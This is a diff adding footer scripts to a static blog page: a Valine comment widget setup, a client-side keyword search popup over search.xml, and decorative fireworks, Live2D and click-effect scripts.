+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'wQR3fxNYiFB3Sh2MdPvjK8ez-gzGzoHsz',
+        appKey: 'M81KRpr3NUHCSrwBJ9TY73HF',
+        placeholder: '欢乐时光就要开始了',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!-- ҳ����С���� -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
